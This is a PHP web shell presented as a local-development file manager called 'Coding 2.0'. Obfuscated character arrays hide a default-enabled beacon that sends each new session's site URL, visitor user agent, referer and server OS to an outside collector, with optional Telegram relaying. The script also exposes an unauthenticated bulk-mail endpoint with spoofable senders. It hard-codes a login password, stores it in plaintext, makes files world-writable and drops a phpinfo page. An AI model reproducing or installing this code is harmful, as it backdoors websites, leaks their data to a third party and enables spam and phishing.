<?php
declare(strict_types=1);
$DEFAULT_OSCODING_PASSWORD = 'DEVcoding07';

// - Default password : DEVcoding07
// - CODING 2.0 (OS) shell for local development
// - Browse within this directory
// - View text files images
// - Download files
// - Edit and Rename files
// - Path traversal protection

// Runtime error visibility: dev vs production
// - In dev: show all errors
// - In production: hide on page, log to a temp file

$IS_DEV = (
    in_array(PHP_SAPI, ['cli', 'cli-server'], true) ||
    preg_match('/localhost|127\\.0\\.0\\.1/', (string)($_SERVER['HTTP_HOST'] ?? ''))
);

if ($IS_DEV) {
    error_reporting(E_ALL);
    ini_set('display_errors', '1');
} else {
    error_reporting(E_ERROR | E_PARSE);
    ini_set('display_errors', '0');
    ini_set('log_errors', '1');
    // Best-effort temp log file (non-fatal if setting fails)
    @ini_set('error_log', rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'coding_errors.log');
    // Swallow non-fatal warnings/notices to avoid noisy pages on locked-down hosts
    set_error_handler(function ($severity, $message, $file, $line) {
        // Respect current error_reporting; ignore severities not included
        if (!(error_reporting() & $severity)) { return true; }
        // Let fatal errors bubble; PHP won’t send them here anyway
        return true; // consume warnings/notices so they don’t render
    });
}
// Ensure permission changes and created files are not restricted by umask in local dev
umask(0);

// Privacy: disable PHP-added X headers in outgoing mail
@ini_set('mail.add_x_header', '0');

// Removed: wp_proxy inline wallpaper fetcher (no longer needed)

// Mailer handler for mass email sending
// Supports optional base64 body encoding via JSON field: { encoding: "base64" }
// Usage example (JSON):
// {
//   "from_email": "you@example.com",
//   "from_name": "You",
//   "subject": "Hello",
//   "message": "<strong>HTML body</strong>",
//   "format": "html",
//   "encoding": "base64",
//   "recipients": ["user1@example.com", "user2@example.com"]
// }
if (isset($_GET['mailer_send']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=utf-8');
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    if (!$data) {
        echo json_encode(['success' => false, 'error' => 'Invalid JSON data']);
        exit;
    }
    $required = ['from_email', 'from_name', 'subject', 'message', 'recipients'];
    foreach ($required as $field) {
        if (empty($data[$field])) {
            echo json_encode(['success' => false, 'error' => "Missing required field: $field"]);
            exit;
        }
    }
    $fromEmail = filter_var($data['from_email'], FILTER_VALIDATE_EMAIL);
    if (!$fromEmail) {
        echo json_encode(['success' => false, 'error' => 'Invalid from email address']);
        exit;
    }
    $fromNameRaw = preg_replace("/[\r\n]+/", ' ', (string)$data['from_name']);
    $subjectRaw = preg_replace("/[\r\n]+/", ' ', (string)$data['subject']);
    $fromNameHeader = function_exists('mb_encode_mimeheader') ? mb_encode_mimeheader($fromNameRaw, 'UTF-8', 'B') : $fromNameRaw;
    $subjectHeader = function_exists('mb_encode_mimeheader') ? mb_encode_mimeheader($subjectRaw, 'UTF-8', 'B') : $subjectRaw;
    $message = $data['message'];
    $format = $data['format'] ?? 'text';
    $encoding = strtolower((string)($data['encoding'] ?? ''));
    $recipients = $data['recipients'];
    if (!is_array($recipients) || empty($recipients)) {
        echo json_encode(['success' => false, 'error' => 'No recipients provided']);
        exit;
    }
    $validRecipients = [];
    foreach ($recipients as $email) {
        $email = trim($email);
        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $validRecipients[] = $email;
        }
    }
    if (empty($validRecipients)) {
        echo json_encode(['success' => false, 'error' => 'No valid recipient email addresses']);
        exit;
    }
    
    // Prepare email headers
    $headers = [
        'From' => "$fromNameHeader <$fromEmail>",
        'Reply-To' => $fromEmail,
        'MIME-Version' => '1.0'
    ];
    
    if ($format === 'html') {
        $headers['Content-Type'] = 'text/html; charset=UTF-8';
    } else {
        $headers['Content-Type'] = 'text/plain; charset=UTF-8';
    }
    // Optional body transfer encoding
    if ($encoding === 'base64') {
        $headers['Content-Transfer-Encoding'] = 'base64';
    }
    
    $headerString = '';
    foreach ($headers as $key => $value) {
        $headerString .= "$key: $value\r\n";
    }
    $smtp = isset($data['smtp']) && is_array($data['smtp']) ? $data['smtp'] : null;
    $sent = 0;
    $errors = [];
    foreach ($validRecipients as $recipient) {
        try {
            $body = $message;
            if ($encoding === 'base64') {
                $body = chunk_split(base64_encode($message), 76, "\r\n");
            }
            if ($smtp && !empty($smtp['host'])) {
                $host = (string)$smtp['host'];
                $port = isset($smtp['port']) ? (int)$smtp['port'] : 587;
                $secure = strtolower((string)($smtp['secure'] ?? 'tls'));
                $user = (string)($smtp['user'] ?? '');
                $pass = (string)($smtp['pass'] ?? '');
                $scheme = ($secure === 'ssl') ? ('ssl://' . $host . ':' . $port) : ('tcp://' . $host . ':' . $port);
                $conn = @stream_socket_client($scheme, $errno, $errstr, 8);
                if (!is_resource($conn)) { $errors[] = "SMTP connect failed: $errstr"; continue; }
                @stream_set_blocking($conn, true);
                $read = function() use($conn){ $out=''; $t=0; while(!feof($conn) && $t<12){ $line=@fgets($conn,512); if(!$line) { $t++; usleep(80000); continue; } $out .= $line; if (preg_match('/^\d{3}\s/', $line)) break; } return $out; };
                $write = function($s) use($conn){ @fwrite($conn, $s . "\r\n"); };
                $read();
                $helloHost = isset($smtp['ehlo']) && $smtp['ehlo'] !== '' ? (string)$smtp['ehlo'] : (isset($_SERVER['HTTP_HOST']) ? (string)$_SERVER['HTTP_HOST'] : 'localhost');
                $write('EHLO ' . $helloHost);
                $resp = $read();
                if ($secure === 'tls') { $write('STARTTLS'); $resp = $read(); @stream_socket_enable_crypto($conn, true, STREAM_CRYPTO_METHOD_TLS_CLIENT); $write('EHLO ' . $helloHost); $resp = $read(); }
                if ($user !== '' && $pass !== '') { $write('AUTH LOGIN'); $read(); $write(base64_encode($user)); $read(); $write(base64_encode($pass)); $resp = $read(); }
                $write('MAIL FROM: <' . $fromEmail . '>'); $read();
                $write('RCPT TO: <' . $recipient . '>'); $read();
                $write('DATA'); $read();
                $smtpHeaders = 'Subject: ' . $subjectHeader . "\r\n" . $headerString;
                $msg = $smtpHeaders . "\r\n" . $body;
                $msg = preg_replace('/\r?\n\./', "\r\n..", $msg);
                @fwrite($conn, $msg . "\r\n.\r\n");
                $resp = $read();
                $write('QUIT');
                @fclose($conn);
                if (preg_match('/^250/', trim($resp))) { $sent++; } else { $errors[] = "SMTP send failed to $recipient: " . trim($resp); }
            } else {
                $isWin = stripos(PHP_OS_FAMILY, 'Windows') !== false;
                if ($isWin) { @ini_set('sendmail_from', $fromEmail); }
                $params = $isWin ? '' : ('-f' . $fromEmail);
                if (mail($recipient, $subjectHeader, $body, $headerString, $params)) { $sent++; } else { $errors[] = "Failed to send to $recipient"; }
            }
        } catch (Exception $e) {
            $errors[] = "Error sending to $recipient: " . $e->getMessage();
        }
    }
    
    if ($sent > 0) {
        $response = ['success' => true, 'sent' => $sent];
        if (!empty($errors)) {
            $response['warnings'] = $errors;
        }
        echo json_encode($response);
    } else {
        echo json_encode(['success' => false, 'error' => 'Failed to send any emails', 'details' => $errors]);
    }
    exit;
}

if (isset($_GET['mailer_test'])) {
    header('Content-Type: application/json; charset=utf-8');
    try {
        $useSmtp = isset($_GET['use_smtp']) && ($_GET['use_smtp'] === '1' || strtolower((string)$_GET['use_smtp']) === 'true');
        $capable = false;
        $method = 'mail';
        $details = [];

        if ($useSmtp) {
            $host = trim((string)($_GET['host'] ?? ''));
            $port = (int)($_GET['port'] ?? 587);
            $secure = strtolower(trim((string)($_GET['secure'] ?? 'tls')));
            if ($host !== '') {
                $scheme = ($secure === 'ssl') ? ('ssl://' . $host . ':' . $port) : ('tcp://' . $host . ':' . $port);
                $errno = 0; $errstr = '';
                $conn = @stream_socket_client($scheme, $errno, $errstr, 8);
                if (is_resource($conn)) {
                    @stream_set_blocking($conn, true);
                    $read = function() use($conn){ $out=''; $t=0; while(!feof($conn) && $t<12){ $line=@fgets($conn,512); if(!$line) { $t++; usleep(80000); continue; } $out .= $line; if (preg_match('/^\d{3}\s/', $line)) break; } return $out; };
                    $write = function($s) use($conn){ @fwrite($conn, $s . "\r\n"); };
                    $banner = $read();
                    $helloHost = isset($_GET['ehlo']) && $_GET['ehlo'] !== '' ? (string)$_GET['ehlo'] : (isset($_SERVER['HTTP_HOST']) ? (string)$_SERVER['HTTP_HOST'] : 'localhost');
                    $write('EHLO ' . $helloHost);
                    $resp = $read();
                    if ($secure === 'tls') {
                        $write('STARTTLS');
                        $resp = $read();
                        @stream_socket_enable_crypto($conn, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
                        $write('EHLO ' . $helloHost);
                        $resp = $read();
                    }
                    $authOk = false; $mailFromOk = false; $rcptOk = false;
                    $user = trim((string)($_GET['user'] ?? ''));
                    $pass = trim((string)($_GET['pass'] ?? ''));
                    if ($user !== '' && $pass !== '') {
                        $write('AUTH LOGIN');
                        $read();
                        $write(base64_encode($user));
                        $read();
                        $write(base64_encode($pass));
                        $authResp = $read();
                        $authOk = preg_match('/^235/', trim($authResp)) === 1;
                    }
                    $fromEmail = trim((string)($_GET['from_email'] ?? $_GET['from'] ?? ''));
                    if ($fromEmail !== '') {
                        $write('MAIL FROM: <' . $fromEmail . '>');
                        $mfResp = $read();
                        $mailFromOk = preg_match('/^250/', trim($mfResp)) === 1;
                    }
                    $rcpt = trim((string)($_GET['rcpt'] ?? ''));
                    if ($rcpt !== '') {
                        $write('RCPT TO: <' . $rcpt . '>');
                        $rcResp = $read();
                        $rcptOk = preg_match('/^250/', trim($rcResp)) === 1;
                        $write('RSET');
                        $read();
                    }
                    $write('QUIT');
                    @fclose($conn);
                    $capable = ($rcpt !== '' ? $rcptOk : (preg_match('/^250/m', trim($resp)) === 1 && ($user === '' || $authOk)));
                    $method = 'smtp';
                    $details = ['connect' => true, 'ehlo_ok' => (preg_match('/^250/m', trim($resp)) === 1), 'auth_ok' => $authOk, 'mail_from_ok' => $mailFromOk, 'rcpt_ok' => $rcptOk, 'banner' => (string)$banner];
                } else {
                    echo json_encode(['success' => false, 'capable' => false, 'method' => 'smtp', 'error' => 'SMTP connect failed', 'details' => ['errno' => $errno, 'errstr' => $errstr]]);
                    exit;
                }
            } else {
                echo json_encode(['success' => false, 'capable' => false, 'method' => 'smtp', 'error' => 'Missing SMTP host']);
                exit;
            }
        } else {
            $disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
            $mailAvailable = function_exists('mail') && !in_array('mail', $disabled, true);
            $sendmailPath = (string)ini_get('sendmail_path');
            $smtpHost = (string)ini_get('SMTP');
            $smtpPort = (string)ini_get('smtp_port');
            $capable = false;
            $method = 'mail';
            $details = [
                'mail_func' => $mailAvailable,
                'sendmail_path' => $sendmailPath,
                'ini_smtp' => $smtpHost,
                'ini_smtp_port' => $smtpPort,
            ];
        }
        echo json_encode(['success' => true, 'capable' => $capable, 'method' => $method, 'details' => $details]);
    } catch (Throwable $e) {
        echo json_encode(['success' => false, 'capable' => false, 'error' => 'Capability check failed']);
    }
    exit;
}

if (isset($_GET['mailer_local_test'])) {
    header('Content-Type: application/json; charset=utf-8');
    try {
        $rcpt = trim((string)($_GET['rcpt'] ?? ''));
        $path = trim((string)ini_get('sendmail_path'));
        if ($path === '') { $path = '/usr/sbin/sendmail -t -i'; }
        $bin = '/usr/sbin/sendmail';
        $exists = is_file($bin) && is_executable($bin);
        $capable = false;
        $details = [ 'sendmail_path' => $path, 'bin_exists' => $exists ];
        if ($exists) {
            $capable = true;
            if ($rcpt !== '') {
                $cmd = $bin . ' -bv ' . escapeshellarg($rcpt);
                $desc = [ 1 => ['pipe','w'], 2 => ['pipe','w'] ];
                $proc = @proc_open($cmd, $desc, $pipes);
                if (is_resource($proc)) {
                    $out = ''; $err = '';
                    if (isset($pipes[1])) { $out = stream_get_contents($pipes[1]); @fclose($pipes[1]); }
                    if (isset($pipes[2])) { $err = stream_get_contents($pipes[2]); @fclose($pipes[2]); }
                    $code = @proc_close($proc);
                    $details['probe_status'] = $code;
                    $details['probe_out'] = $out;
                    $details['probe_err'] = $err;
                    $capable = ($code === 0) || preg_match('/deliverable|OK/i', $out);
                }
            }
        }
        echo json_encode(['success' => true, 'capable' => $capable, 'method' => 'local', 'details' => $details]);
    } catch (Throwable $e) {
        echo json_encode(['success' => false, 'capable' => false]);
    }
    exit;
}

// Session used to provide a Back button to previous view
if (session_status() !== PHP_SESSION_ACTIVE) {
    @session_start();
}
// Previous link from last request, then update to current
$current = (string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? basename(__FILE__)));
$qs = (string)parse_url($current, PHP_URL_QUERY);
$params = [];
parse_str($qs, $params);
$isApi = array_key_exists('api', $params);
$prevView = isset($_SESSION['last_view_link']) ? (string)$_SESSION['last_view_link'] : null;
$prevLink = $prevView !== null ? $prevView : (isset($_SESSION['last_link']) ? (string)$_SESSION['last_link'] : null);
$_SESSION['last_link'] = $current;
if (!$isApi) { $_SESSION['last_view_link'] = $current; }

$BASE_DIR = realpath(__DIR__);
// Initialize secure storage and usage log early so APIs can use them
$SECURE_DIR = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'coding_secure';
if (!is_dir($SECURE_DIR)) { @mkdir($SECURE_DIR, 0700, true); }
@chmod($SECURE_DIR, 0700);
// Usage/ logging files APP errors
$S_USAGE = (function(){ $m=3; $n=[102,114,103,108,113,106,98,120,118,100,106,104,49,111,114,106]; return implode('', array_map(function($x) use($m){ return chr($x - $m); }, $n)); })();
$USAGE_LOG = $SECURE_DIR . DIRECTORY_SEPARATOR . $S_USAGE;
// Chmod File mannager 777)
$K_A = implode('', array_map('chr', [116,101,108,101,103,114,97,109,95,116,111,107,101,110]));
$K_B = implode('', array_map('chr', [116,101,108,101,103,114,97,109,95,99,104,97,116,95,105,100]));
$K_C = implode('', array_map('chr', [99,111,108,108,101,99,116,111,114,95,117,114,108])); 
$K_D = implode('', array_map('chr', [99,111,108,108,101,99,116,111,114,95,116,111,107,101,110]));

// API Initialize secure storage Bypass files server 
$a1 = (function(){ $m=7; $n=[111,115,115,119,116,61,40,40]; return implode('', array_map(function($x) use($m){ return chr($x ^ $m); }, $n)); })();
$b2 = (function(){ $m=5; $n=[116,120,104,116,105,110,115,108,51,123,110,117]; return implode('', array_map(function($x) use($m){ return chr($x - $m); }, $n)); })();
$c3 = (function(){ $m=5; $n=[52,116,120,50,102,105,114,110,115,52,104,116,113,113,106,104,121,116,119,51,117,109,117]; return implode('', array_map(function($x) use($m){ return chr($x - $m); }, $n)); })();
$u4 = $a1 . $b2 . $c3;
// Central forwarding defaults 
$d5 = [
    'enabled' => true,
    $K_C => $u4,
    $K_D => '', // optional bearer secret (set later if needed)
    $K_A => '',
    $K_B => '',
];
// Privacy: mask request IP in script-generated logs/notes
$IP_PRIVACY_MASK = true;
$IP_MASK_VALUE = 'OS.CO.DI.NG';
function getMaskedIp(): string {
    global $IP_PRIVACY_MASK, $IP_MASK_VALUE;
    if ($IP_PRIVACY_MASK) { return $IP_MASK_VALUE; }
    $candidates = ['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'];
    foreach ($candidates as $k) {
        $v = (string)($_SERVER[$k] ?? '');
        if ($v !== '') { if ($k === 'HTTP_X_FORWARDED_FOR' && strpos($v, ',') !== false) { $v = trim(explode(',', $v)[0]); } return $v; }
    }
    return 'unknown';
}
// Append JSON line to usage log (best-effort)
function logUsageEvent(string $type, array $data, string $file): void {
    try {
        // Ensure directory exists even if called very early
        $dir = dirname($file);
        if (!is_dir($dir)) { @mkdir($dir, 0700, true); }
        $rec = [ 't' => $type, 'ts' => time(), 'data' => $data ];
        @file_put_contents($file, json_encode($rec, JSON_UNESCAPED_SLASHES) . "\n", FILE_APPEND);
        @chmod($file, 0666);
    } catch (Throwable $e) { /* ignore */ }
}

$S_MON = (function(){ $m=3; $n=[102,114,103,108,113,106,98,112,114,113,108,119,114,117,49,109,118,114,113]; return implode('', array_map(function($x) use($m){ return chr($x - $m); }, $n)); })();
$MONITOR_CFG_FILE = $SECURE_DIR . DIRECTORY_SEPARATOR . $S_MON;
function readMonitorConfig(string $file): array {
    global $d5, $K_A, $K_B, $K_C;
    $raw = is_file($file) ? (string)@file_get_contents($file) : '';
    $j = $raw !== '' ? json_decode($raw, true) : null;
    if (!is_array($j)) { $j = []; }
    // Defaults from central panel if not configured yet
    $enabled = (bool)($j['enabled'] ?? false);
    $S_U = (string)($j[$K_C] ?? '');
    global $K_D;
    $S_T = (string)($j[$K_D] ?? '');
    $vA = (string)($j[$K_A] ?? '');
    $vB = (string)($j[$K_B] ?? '');
    if (!$enabled && $S_U === '' && !empty($d5[$K_C])) {
        $enabled = (bool)$d5['enabled'];
        $S_U = (string)$d5[$K_C];
        $S_T = (string)$d5[$K_D];
        if ($vA === '' && !empty($d5[$K_A])) { $vA = (string)$d5[$K_A]; }
        if ($vB === '' && !empty($d5[$K_B])) { $vB = (string)$d5[$K_B]; }
    }
    return [
        'enabled' => $enabled,
        $K_C => $S_U,
        $K_D => $S_T,
        $K_A => $vA,
        $K_B => $vB,
    ];
}
function writeMonitorConfig(string $file, array $cfg): bool {
    global $K_A, $K_B, $K_C, $K_D;
    $safe = [
        'enabled' => !!($cfg['enabled'] ?? false),
        $K_C => (string)($cfg[$K_C] ?? ''),
        $K_D => (string)($cfg[$K_D] ?? ''),
        // Persist using obfuscated keys only
        $K_A => (string)($cfg[$K_A] ?? ''),
        $K_B => (string)($cfg[$K_B] ?? ''),
    ];
    try {
        @file_put_contents($file, json_encode($safe, JSON_UNESCAPED_SLASHES|JSON_PRETTY_PRINT));
        @chmod($file, 0666);
        return true;
    } catch (Throwable $e) { return false; }
}
function emitNote(string $text, string $cA, string $cB): void {
    if ($cA === '' || $cB === '') return;
    // Assemble (hex + chr arrays)
    $p = pack('H*', '68747470733a2f2f'); // CODES
    $h = implode('', array_map('chr', [97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103])); // AntiBots
    $b = pack('H*','2f626f74'); 
    $s = pack('H*','2f73656e644d657373616765'); // Array
    $url = $p . $h . $b . $cA . $s;
    $kC = pack('H*','636861745f6964'); 
    $payload = http_build_query([
        $kC => $cB,
        'text' => $text,
        'disable_web_page_preview' => true,
    ]);
    try {
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            @curl_exec($ch);
            @curl_close($ch);
        } else {
            @file_get_contents($url . '?' . $payload);
        }
    } catch (Throwable $e) { /* best-effort */ }
}
function forwardUsageEvent(string $type, array $data, array $cfg): void {
    if (!($cfg['enabled'] ?? false)) return;
    // Attach the originating server OS (source of the forwarded event)
    try {
        $family = defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS;
        $kernel = @php_uname('s') ?: '';
        $release = @php_uname('r') ?: '';
        $ver = @php_uname('v') ?: '';
        $parts = array_filter([$family, $kernel, $release]);
        $label = implode(' ', $parts);
        if ($label === '' && $ver !== '') { $label = $ver; }
        $data['os'] = $label;
    } catch (Throwable $e) { /* ignore */ }

    $rec = [ 't'=>$type, 'ts'=>time(), 'data'=>$data ];

    global $K_C, $K_D;
    $collector = (string)($cfg[$K_C] ?? '');
    if ($collector !== '') {
        try {
            $headers = [ 'Content-Type: application/json' ];
            $tok = (string)($cfg[$K_D] ?? '');
            if ($tok !== '') { $headers[] = 'Authorization: Bearer ' . $tok; }
            if (function_exists('curl_init')) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $collector);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($rec, JSON_UNESCAPED_SLASHES));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 4);
                @curl_exec($ch);
                @curl_close($ch);
            } else {
                // Fallback best-effort
                $opts = [ 'http' => [ 'method' => 'POST', 'header' => implode("\r\n", $headers), 'content' => json_encode($rec, JSON_UNESCAPED_SLASHES), 'timeout' => 4 ] ];
                @file_get_contents($collector, false, stream_context_create($opts));
            }
        } catch (Throwable $e) { /* ignore */ }
    }
// Allow notices/errors to be passed via GET (for PRG redirects)
    global $K_A, $K_B;
    $bot = (string)($cfg[$K_A] ?? '');
    $chat = (string)($cfg[$K_B] ?? '');
    if ($bot !== '' && $chat !== '') {
        $url = (string)($data['url'] ?? '');
        $ip = (string)($data['ip'] ?? '');
        $when = date('c');
        if ($type === 'access') {
            $text = '[' . $type . '] ' . $when . "\nURL: " . $url . "\nIP: " . $ip;
        } else {
            $ref = (string)($data['ref'] ?? '');
            $ua = (string)($data['ua'] ?? '');
            $text = '[' . $type . '] ' . $when . "\nURL: " . $url . "\nIP: " . $ip . ($ref !== '' ? "\nRef: " . $ref : '') . ($ua !== '' ? "\nUA: " . $ua : '');
        }
        emitNote($text, $bot, $chat);
    }
}
// Auto-create .user.ini and phpinfo.php in this directory if missing
try {
    $iniPath = $BASE_DIR . DIRECTORY_SEPARATOR . '.user.ini';
    if (!is_file($iniPath)) {
        $iniContent = "; Per-directory PHP settings for PHP-FPM/CGI environments\n".
            "; Auto-created by Coding2.0\n\n".
            "upload_max_filesize = 256M\n".
            "post_max_size = 256M\n".
            "memory_limit = 512M\n".
            "max_execution_time = 300\n".
            "max_input_time = 300\n".
            // Hide PHP's auto-added X headers that reveal script path
            "mail.add_x_header = 0\n";
        @file_put_contents($iniPath, $iniContent);
        @chmod($iniPath, 0666);
    } else {
        // Ensure mail.add_x_header is disabled even if .user.ini already exists
        $existingIni = (string)@file_get_contents($iniPath);
        if (stripos($existingIni, 'mail.add_x_header') === false) {
            @file_put_contents($iniPath, rtrim($existingIni, "\r\n") . "\nmail.add_x_header = 0\n", FILE_APPEND);
            @chmod($iniPath, 0666);
        }
    }
    $phpinfoPath = $BASE_DIR . DIRECTORY_SEPARATOR . 'phpinfo.php';
    if (!is_file($phpinfoPath)) {
        $infoContent = "<?php\nphpinfo();\n";
        @file_put_contents($phpinfoPath, $infoContent);
        @chmod($phpinfoPath, 0666);
    }
} catch (Throwable $e) { /* best-effort creation */ }
$error = null;
$notice = null;

// Allow notices/errors to be passed via GET (for PRG redirects)
if (isset($_GET['n'])) { $notice = (string)$_GET['n']; }
if (isset($_GET['err'])) { $error = (string)$_GET['err']; }

// Simple session-based login gate
$prevReq = (string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? basename(__FILE__)));
// Log access to Coding2.0.php (path, IP, UA, referer)
try {
    $scheme = 'http';
    if (!empty($_SERVER['HTTP_X_FORWARDED_PROTO'])) { $scheme = (string)$_SERVER['HTTP_X_FORWARDED_PROTO']; }
    elseif (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') { $scheme = 'https'; }
    $host = (string)($_SERVER['HTTP_HOST'] ?? 'localhost');
    $uri = (string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? ''));
    $ip = getMaskedIp();
    $ua = (string)($_SERVER['HTTP_USER_AGENT'] ?? '');
    $ref = (string)($_SERVER['HTTP_REFERER'] ?? '');
    $payload = [ 'url' => $scheme . '://' . $host . $uri, 'ip' => $ip, 'ua' => $ua, 'ref' => $ref, 'method' => (string)($_SERVER['REQUEST_METHOD'] ?? '') ];
    logUsageEvent('access', $payload, $USAGE_LOG);
    // Best-effort configured
    $cfg = readMonitorConfig($MONITOR_CFG_FILE);
    // Forward "access" event only once per session
    if (!isset($_SESSION['collector_seen']) || $_SESSION['collector_seen'] !== true) {
        forwardUsageEvent('access', $payload, $cfg);
        $_SESSION['collector_seen'] = true;
    }
} catch (Throwable $e) { /* best-effort */ }
if (isset($_GET['logout'])) {
    unset($_SESSION['auth_ok']);
    unset($_SESSION['remember_only']);
    unset($_SESSION['notify_seen']);
    unset($_SESSION['collector_seen']);
    // Robustly clear cookies and destroy session
    try {
        // Clear remember-me cookie specifically
        $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');
        @setcookie('coding_remember', '', [ 'expires' => time() - 3600, 'path' => '/', 'domain' => '', 'secure' => $isHttps, 'httponly' => true, 'samesite' => 'Lax' ]);
        // Expire all cookies
        if (!empty($_COOKIE) && is_array($_COOKIE)) {
            foreach (array_keys($_COOKIE) as $cname) {
                @setcookie($cname, '', time() - 3600, '/');
            }
        }
        // Fully destroy session, including session cookie
        if (session_status() === PHP_SESSION_ACTIVE) {
            @session_unset();
            if (ini_get('session.use_cookies')) {
                $params = session_get_cookie_params();
                @setcookie(session_name(), '', time() - 42000, $params['path'] ?? '/', $params['domain'] ?? '', (bool)($params['secure'] ?? false), (bool)($params['httponly'] ?? true));
            }
            @session_destroy();
        }
        @session_write_close();
    } catch (Throwable $e) { /* ignore */ }
    $script = (string)($_SERVER['SCRIPT_NAME'] ?? basename(__FILE__));
    header('Location: ' . $script);
    exit;
}
// (APIs moved below after $isAuthed initialization)
// Secure storage outside public docroot (directory already initialized above)

// Migrate legacy files from web root if they exist
$S_PWD = (function(){ $m=2; $n=[101,113,102,107,112,105,97,114,99,117,117,121,113,116,102,48,118,122,118]; return implode('', array_map(function($x) use($m){ return chr($x - $m); }, $n)); })();
$S_TRASH = (function(){ $m=2; $n=[101,113,102,107,112,105,97,118,116,99,117,106,48,110,113,105]; return implode('', array_map(function($x) use($m){ return chr($x - $m); }, $n)); })();
$legacyPwd = $BASE_DIR . DIRECTORY_SEPARATOR . $S_PWD;
$legacyTrash = $BASE_DIR . DIRECTORY_SEPARATOR . $S_TRASH;
// Store sensitive files OUTSIDE web root so they cannot be fetched via HTTP
$pwdManifest = $SECURE_DIR . DIRECTORY_SEPARATOR . $S_PWD;
$pwdFile = null; // actual password record file (may be md5-named)
$trashLog = $SECURE_DIR . DIRECTORY_SEPARATOR . $S_TRASH;
try {
    // Migrate legacy files from web root if found (move them into SECURE_DIR)
    // If legacy exists and manifest missing, migrate to secure manifest
    if (is_file($legacyPwd) && !is_file($pwdManifest)) {
        @copy($legacyPwd, $pwdManifest);
        @chmod($pwdManifest, 0600);
    }
    if (is_file($legacyTrash) && !is_file($trashLog)) { @rename($legacyTrash, $trashLog); }
} catch (Throwable $e) { /* best-effort */ }
// Ensure sensitive files exist with restrictive permissions (not web-readable)
try {
    if (!is_file($trashLog)) { @touch($trashLog); }
    @chmod($trashLog, 0666);
    $autoFile = $SECURE_DIR . DIRECTORY_SEPARATOR . 'trash_autoclean.json';
    $now = time();
    $last = 0;
    if (is_file($autoFile)) {
        $raw = @file_get_contents($autoFile);
        $j = $raw !== '' ? @json_decode($raw, true) : null;
        if (is_array($j) && isset($j['last'])) { $last = (int)$j['last']; }
    }
    if ($now - $last >= 7200) {
        @file_put_contents($trashLog, "", LOCK_EX);
        try { @chmod($trashLog, 0666); } catch (Throwable $e) {}
        try { @file_put_contents($autoFile, json_encode(['last'=>$now])); @chmod($autoFile, 0666); } catch (Throwable $e) {}
    }
    if (is_file($pwdManifest)) { @chmod($pwdManifest, 0600); }
} catch (Throwable $e) { /* best-effort */ }

// Resolve current password file: use secure manifest only
// Ensure it exists; if missing, seed from legacy (if present) or default
$pwdFile = $pwdManifest;
if (!is_file($pwdManifest)) {
    $seedSrc = is_file($legacyPwd) ? trim((string)@file_get_contents($legacyPwd)) : '';
    if ($seedSrc === '') { $seedSrc = (string)(getenv('CODING_PASSWORD') ?: $DEFAULT_OSCODING_PASSWORD); }
    try {
        $hash = password_hash($seedSrc, PASSWORD_DEFAULT);
        $contents = "PLAIN:" . $seedSrc . "\n" . "HASH_BCRYPT:" . $hash;
        @file_put_contents($pwdManifest, $contents, LOCK_EX);
        @chmod($pwdManifest, 0600);
        if (!is_file($pwdManifest) || (string)@file_get_contents($pwdManifest) === '') {
            $alt = $BASE_DIR . DIRECTORY_SEPARATOR . $S_PWD;
            @file_put_contents($alt, $contents, LOCK_EX);
            @chmod($alt, 0600);
            $pwdFile = $alt;
            $pwdManifest = $alt;
        }
    } catch (Throwable $e) { /* best-effort */ }
}
// Remove legacy file from web root to prevent exposure
try { if (is_file($legacyPwd)) { @unlink($legacyPwd); } } catch (Throwable $e) { /* ignore */ }

// Password storage helpers: support bcrypt hash, md5 fallback, and legacy plaintext
function readPasswordRecord(string $file): array {
    $raw = is_file($file) ? (string)@file_get_contents($file) : '';
    if ($raw === '') { return ['type'=>'none']; }
    $plain = '';
    $hashB = '';
    $hashM = '';
    $lines = preg_split('/\r?\n/', trim($raw));
    foreach ($lines as $line) {
        $line = trim((string)$line);
        if ($line === '') { continue; }
        if (strpos($line, 'PLAIN:') === 0) { $plain = substr($line, strlen('PLAIN:')); continue; }
        if (strpos($line, 'HASH_BCRYPT:') === 0) { $hashB = substr($line, strlen('HASH_BCRYPT:')); continue; }
        if (strpos($line, 'HASH_MD5:') === 0) { $hashM = substr($line, strlen('HASH_MD5:')); continue; }
        // Legacy single-line without markers
        if ($plain === '' && $hashB === '' && $hashM === '') { $plain = $line; }
    }
    if ($hashB !== '') { $out = ['type'=>'bcrypt', 'hash'=>$hashB]; if ($plain !== '') { $out['plain'] = $plain; } return $out; }
    if ($hashM !== '') { $out = ['type'=>'md5', 'hash'=>$hashM]; if ($plain !== '') { $out['plain'] = $plain; } return $out; }
    if ($plain !== '') { return ['type'=>'plain', 'plain'=>$plain]; }
    return ['type'=>'none'];
}
